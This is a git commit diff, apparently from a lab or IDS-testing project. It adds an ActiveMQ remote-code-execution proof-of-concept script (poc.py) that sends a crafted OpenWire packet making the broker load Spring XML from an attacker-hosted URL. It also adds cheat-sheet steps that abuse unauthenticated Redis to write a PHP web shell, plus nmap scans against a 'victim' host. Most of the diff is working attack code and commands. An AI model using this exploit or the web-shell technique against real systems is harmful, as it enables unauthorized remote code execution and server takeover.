e65bd250c183c77d7b91201f9af0269b8f719807
krasov <me@frostfree.ru>
2025-10-19 12:44:52 +0300

    implement active mq vult

--- help.md
+++ help.md
@@ -5,7 +5,7 @@
 sudo iptables -L DOCKER-USER -nv --line-numbers
 ```
 
-### Проверить Логи:
+### Проверить Логи Suricata:
 ```bash
 journalctl -u suricata.service -b
 sudo tail -n 200 /var/log/suricata/suricata.log
@@ -13,7 +13,7 @@ sudo tail -n 0 -f /var/log/suricata/fast.log
 sudo tail -n 0 -f /var/log/suricata/eve.json | jq .
 ```
 
-### Запустить suricata вручную:
+### Запустить Suricata вручную:
 ```bash
 sudo suricata -c /etc/suricata/suricata.yaml -q 0
 ```
@@ -24,4 +24,26 @@ nmap -sS victim     # SYN scan
 nmap -sX victim     # Xmas scan
 nmap -sU victim     # UDP scan
 nmap -O victim      # OS detection
+```
+
+### ActiveMQ
+```bash
+cd /opt
+python3 -m http.server 8888
+python3 poc.py -i 172.20.0.101 -p 61616 -u http://172.20.0.10:8888/poc.xml
+```
+
+### Redis Unauthorized Access + Command Execution
+```bash
+nmap -sV -p 6379 172.20.0.102
+redis-cli -h 172.20.0.102 ping
+redis-cli -h 172.20.0.102
+>>> info server
+>>> config get "*"
+>>> keys *
+>>> dbsize
+>>> config set dir /tmp
+>>> config set dbfilename webshell.php
+>>> set test "<?php system($_GET['cmd']); ?>"
+>>> save
 ```
--- roles/warfare/files/active_mq/poc.py
+++ roles/warfare/files/active_mq/poc.py
@@ -1,36 +1,50 @@
-import io
-import socket
-import sys
-
-
-def main(ip, port, xml):
-    classname = "org.springframework.context.support.ClassPathXmlApplicationContext"
-    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    socket_obj.connect((ip, port))
-    with socket_obj:
-        out = socket_obj.makefile("wb")
-        out.write(int(32).to_bytes(4, "big"))
-        out.write(bytes([31]))
-        out.write(int(1).to_bytes(4, "big"))
-        out.write(bool(True).to_bytes(1, "big"))
-        out.write(int(1).to_bytes(4, "big"))
-        out.write(bool(True).to_bytes(1, "big"))
-        out.write(bool(True).to_bytes(1, "big"))
-        out.write(len(classname).to_bytes(2, "big"))
-        out.write(classname.encode("utf-8"))
-        out.write(bool(True).to_bytes(1, "big"))
-        out.write(len(xml).to_bytes(2, "big"))
-        out.write(xml.encode("utf-8"))
-        out.flush()
-        out.close()
-
-    if __name__ == "__main__":
-        if len(sys.argv) != 4:
-            print(
-                "Please specify the target and port and poc.xml: python3 "
-                "poc.py 172.20.0.101 61616 "
-                "http://172.20.0.10:8888/poc.xml"
-            )
-            exit(-1)
-
-    main(sys.argv[1], int(sys.argv[2]), sys.argv[3])
+import socket 
+import argparse 
+ 
+def main(ip, port, url): 
+    if not ip or not url: 
+        print("Usage: script.py -i <ip> -p <port> -u <url>") 
+        return 
+     
+    banner() 
+     
+    class_name = "org.springframework.context.support.ClassPathXmlApplicationContext" 
+    message = url 
+ 
+    header = "1f00000000000000000001" 
+    body = header + "01" + int2hex(len(class_name), 4) + string2hex(class_name) + "01" + int2hex(len(message), 4) + string2hex(message) 
+    payload = int2hex(len(body) // 2, 8) + body 
+    data = bytes.fromhex(payload) 
+ 
+    print("[*] Target:", f"{ip}:{port}") 
+    print("[*] XML URL:", url) 
+    print() 
+    print("[*] Sending packet:", payload) 
+ 
+    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+    conn.connect((ip, int(port))) 
+    conn.send(data) 
+    conn.close() 
+ 
+def banner(): 
+    print("     _        _   _           __  __  ___        ____   ____ _____ \n    / \\   ___| |_(_)_   _____|  \\/  |/ _ \\      |  _ \\ / ___| ____|\n   / _ \\ / __| __| \\ \\ / / _ \\ |\\/| | | | |_____| |_) | |   |  _|  \n  / ___ \\ (__| |_| |\\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ \n /_/   \\_\\___|\\__|_| \\_/ \\___|_|  |_|\\__\\_\\     |_| \\_\\\\____|_____|\n") 
+ 
+def string2hex(s): 
+    return s.encode().hex() 
+ 
+def int2hex(i, n): 
+    if n == 4: 
+        return format(i, '04x') 
+    elif n == 8: 
+        return format(i, '08x') 
+    else: 
+        raise ValueError("n must be 4 or 8") 
+ 
+if __name__ == "__main__": 
+    parser = argparse.ArgumentParser() 
+    parser.add_argument("-i", "--ip", help="ActiveMQ Server IP or Host") 
+    parser.add_argument("-p", "--port", default="61616", help="ActiveMQ Server Port") 
+    parser.add_argument("-u", "--url", help="Spring XML Url") 
+    args = parser.parse_args() 
+     
+    main(args.ip, args.port, args.url)
